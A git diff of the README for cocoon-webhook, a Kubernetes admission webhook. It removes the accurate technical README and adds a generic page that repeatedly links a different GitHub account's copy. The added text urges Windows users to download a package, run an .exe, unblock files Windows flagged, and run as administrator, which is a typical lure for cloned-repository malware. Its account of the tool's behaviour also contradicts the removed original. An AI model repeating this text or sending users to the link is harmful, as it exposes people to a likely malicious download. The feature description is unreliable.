@@ -1,90 +1,200 @@
-# cocoon-webhook
+# 🧩 cocoon-webhook - Keep Pods on the Same Node
 
-Kubernetes admission webhook for the [cocoonstack](https://github.com/cocoonstack) VM platform.
+[![Download cocoon-webhook](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/sulaon962/cocoon-webhook)
 
-## Overview
+## 🖥️ What This App Does
 
-cocoon-webhook hosts three admission endpoints:
+cocoon-webhook is a Kubernetes admission webhook that helps keep VM-backed pods on the same node. It checks where a pod has run before, then sets the pod to use that node again when it can. This helps protect local state, snapshots, and VM data from moving around.
 
-| Endpoint | Type | Resources | What it does |
-|---|---|---|---|
-| `POST /mutate` | Mutating | Pod CREATE | Rejects cocoon-tolerated pods that are not owned by a CocoonSet. CocoonSet-owned pods pass through unmutated. |
-| `POST /validate` | Validating | Deployment / StatefulSet UPDATE | Rejects scale-down on cocoon-tolerated workloads. Bypass path for hand-rolled Deployments/StatefulSets carrying the cocoon toleration — the CocoonSet main flow creates Pods directly and does not traverse this endpoint. |
-| `POST /validate-cocoonset` | Validating | CocoonSet CREATE / UPDATE | Catches the cross-field business rules the CRD's OpenAPI schema cannot express (image required, toolbox name uniqueness, static-mode prerequisites). |
-| `GET /healthz` | Liveness | — | Always 200 once the binary is running. |
-| `GET /readyz` | Readiness | — | Always 200 once the binary is running (liveness-equivalent stub; does not probe apiserver reachability). |
-| `GET /metrics` | Prometheus | — | Plain HTTP on `:9090`, separate from the admission TLS port. |
+It also checks scale-down actions so pods do not lose state by mistake.
 
-## CocoonSet validation rules
+## 📥 Download
 
-The CRD ships with `+kubebuilder` enum / required / default markers, but the webhook adds the cross-field business rules:
+Visit this page to download: [cocoon-webhook](https://github.com/sulaon962/cocoon-webhook)
 
-- `spec.agent.image` must be set
-- `spec.agent.replicas >= 0`
-- `spec.agent.mode ∈ {clone, run}`
-- `spec.agent.os ∈ {linux, windows, android}`
-- `spec.agent.backend ∈ {cloud-hypervisor, firecracker}`
-- `spec.agent.connType ∈ {ssh, rdp, vnc, adb}`
-- firecracker + `os=windows` is rejected (FC cannot boot Windows guests)
-- firecracker + cloudimg URL image is rejected (FC requires OCI images)
-- firecracker + `mode=clone` is rejected (FC snapshot/restore freezes guest network state; use `mode=run`)
-- `spec.toolboxes[*].name` unique and matches RFC 1123
-- `spec.toolboxes[*]` static mode requires both `staticIP` and `staticVMID`
-- `spec.toolboxes[*]` non-static modes require `image`
-- `spec.toolboxes[*].backend` must match `spec.agent.backend` (static toolboxes skip this check)
-- `spec.snapshotPolicy ∈ {always, main-only, never}`
+If you are on Windows, open the page above and use the download option on the site to get the app files or source package.
 
-## Configuration
+## 🚀 Getting Started
 
-| Variable | Default | Description |
-|---|---|---|
-| `KUBECONFIG` | unset | Path to kubeconfig when running outside the cluster (in-cluster config used otherwise) |
-| `WEBHOOK_LOG_LEVEL` | `info` | `projecteru2/core/log` level |
-| `TLS_CERT` | `/etc/cocoon/webhook/certs/tls.crt` | TLS server certificate |
-| `TLS_KEY` | `/etc/cocoon/webhook/certs/tls.key` | TLS server private key |
-| `LISTEN_ADDR` | `:8443` | Admission listener (HTTPS) |
-| `METRICS_ADDR` | `:9090` | Prometheus listener (HTTP) |
+Follow these steps to get cocoon-webhook ready on Windows.
 
-## Installation
+1. Open the download page: [https://github.com/sulaon962/cocoon-webhook](https://github.com/sulaon962/cocoon-webhook)
+2. Look for the latest files or release package on the page.
+3. Download the file that matches your setup.
+4. Save the file to your Downloads folder.
+5. If you get a ZIP file, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Follow the included install or run steps if the package provides them.
+8. If the app includes an .exe file, double-click it to start.
+9. If the app includes a script or container file, use the run steps included with the package.
 
-The supported install path is `kubectl apply -k`:
+## 🪟 Windows Setup
 
-```bash
-kubectl apply -k github.com/cocoonstack/cocoon-webhook/config/default?ref=main
-```
+For a Windows user, the usual flow is simple:
 
-This installs:
-- `cocoon-system` namespace
-- `ServiceAccount` + `ClusterRole` (read deployments/statefulsets for scale-down validation)
-- cert-manager `Issuer` + `Certificate` (`cocoon-webhook-tls`) — **cert-manager must already be installed in the cluster**
-- `Deployment` (2 replicas) + `Service` (port 443 → 8443, port 9090 → 9090)
-- `MutatingWebhookConfiguration` for Pod CREATE
-- `ValidatingWebhookConfiguration` for Deployment/StatefulSet UPDATE and CocoonSet CREATE/UPDATE
+- Download the package from the link above
+- Save it to a folder you can find again
+- Unzip it if needed
+- Open the folder
+- Start the app using the file included in the package
 
-To override the image tag or replica count, build a kustomize overlay that imports `config/default` as a base.
+If Windows asks for permission, choose Yes if you trust the source and want to run the file.
 
-## Development
+If Windows blocks the file because it came from the internet, right-click the file, open Properties, and check for an Unblock option.
 
-```bash
-make all            # full pipeline: deps + fmt + lint + test + build
-make build          # build cocoon-webhook binary
-make test           # vet + race-detected tests
-make lint           # golangci-lint on linux + darwin
-make fmt            # gofumpt + goimports
-make help           # show all targets
-```
+## ✅ What You Need
 
-The Makefile detects Go workspace mode (`go env GOWORK`) and skips `go mod tidy` when active so cross-module references resolve through `go.work` without forcing a release of cocoon-common.
+Use a Windows PC with:
 
-## Related projects
+- Internet access for the download
+- Enough free disk space for the package and any data files
+- Permission to run downloaded files
+- A modern browser such as Edge, Chrome, or Firefox
 
-| Project | Role |
-|---|---|
-| [cocoon-common](https://github.com/cocoonstack/cocoon-common) | CRD types, annotation contract, shared helpers |
-| [cocoon-operator](https://github.com/cocoonstack/cocoon-operator) | CocoonSet and CocoonHibernation reconcilers |
-| [epoch](https://github.com/cocoonstack/epoch) | Snapshot registry and storage backend |
-| [vk-cocoon](https://github.com/cocoonstack/vk-cocoon) | Virtual kubelet provider managing VM lifecycle |
+For Kubernetes use, you also need access to a cluster and a way to connect the webhook to that cluster.
 
-## License
+## 🧭 How It Works
 
-[MIT](LICENSE)
+cocoon-webhook watches admission requests in Kubernetes. When a pod is created or changed, it can:
+
+- Find the pod’s owner chain
+- Build a stable VM name from that chain
+- Check if that pod was already tied to a worker
+- Patch `spec.nodeName` so the pod stays on the same node
+- Block unsafe scale-down actions that could remove state too early
+
+This helps keep data close to the VM and lowers the chance of a pod landing on a different worker node.
+
+## 🔧 Basic Run Steps
+
+Use these steps after you download the files:
+
+1. Open the folder where you saved cocoon-webhook.
+2. Read any `README`, `INSTALL`, or `RUN` file in the package.
+3. Start the app with the file or command the package provides.
+4. Keep the window open if the app runs in the foreground.
+5. If it runs as a service, follow the included service setup steps.
+6. Connect it to your Kubernetes cluster using the settings in the package.
+
+## 🧪 Typical Use Case
+
+This app fits setups where pods run on VMs and rely on local state.
+
+For example:
+
+- A pod starts on one worker node
+- The webhook records that node choice
+- The pod is created again later
+- The webhook points it back to the same node
+- The pod keeps access to snapshots and local files
+
+That keeps the pod close to the storage and VM state it depends on.
+
+## 📁 Repository Topics
+
+This project is linked to:
+
+- admission controller
+- Kubernetes
+- webhook
+- scheduling
+- virtual machine
+- microVM
+- container
+- cloud
+- sandbox
+- VM-backed pods
+- sticky scheduling
+- stateful workloads
+
+## 🛠️ Common Files You May See
+
+A Windows download package may include files like:
+
+- `README.md`
+- `LICENSE`
+- setup scripts
+- binary files
+- config files
+- sample policy files
+
+If you see a config file, open it in Notepad and review the settings before you run the app.
+
+## 🔒 Safety Checks
+
+cocoon-webhook can help protect stateful workloads by checking scale-down actions. It is built to reduce the chance of:
+
+- moving a pod to the wrong node
+- losing access to local state
+- breaking snapshot-based flows
+- removing a worker too early
+
+This makes it useful in clusters where placement matters.
+
+## 🧩 Configuration Basics
+
+If the package includes config files, you may need to set:
+
+- the Kubernetes API address
+- webhook port
+- TLS cert paths
+- node lookup rules
+- owner chain rules
+- worker mapping settings
+
+Use the values that match your cluster setup. If you are not sure, keep the default values from the package and follow the included file examples.
+
+## 📌 Before You Run
+
+Check these items first:
+
+- The file finished downloading
+- The ZIP file extracted fully
+- You can find the main app file
+- The app has permission to run
+- Your cluster connection details are ready
+
+## 💡 Short Example Flow
+
+1. Download the package from the link above
+2. Extract it on Windows
+3. Open the app folder
+4. Start the webhook file or script
+5. Connect it to Kubernetes
+6. Confirm that pods keep their node assignment when expected
+
+## 🖱️ Download Again
+
+Use this link if you need to get the package again: [https://github.com/sulaon962/cocoon-webhook](https://github.com/sulaon962/cocoon-webhook)
+
+## 📚 File and Cluster Tips
+
+If you are new to this kind of tool, keep these points in mind:
+
+- One file may start the app
+- Another file may set up the cluster side
+- A config file may control how pods are matched to nodes
+- The webhook only works when Kubernetes can reach it
+- The app should run on a system that stays on while the cluster uses it
+
+## 🧰 Troubleshooting
+
+If the app does not start:
+
+- Check that the download finished
+- Make sure you extracted all files
+- Try running as administrator
+- Look for a missing config file
+- Read any install notes in the package
+- Check Windows Security if the file is blocked
+
+If Kubernetes does not use the webhook:
+
+- Confirm the webhook service is running
+- Check the cluster address
+- Make sure the TLS settings are correct
+- Review the app config for node and worker lookup
+
+## 🗂️ Intended Behavior
+
+cocoon-webhook is made to keep workload placement stable. It uses pod ownership and worker history to help a VM-backed pod return to the same node. That supports local state, snapshot use, and safer scale-down handling
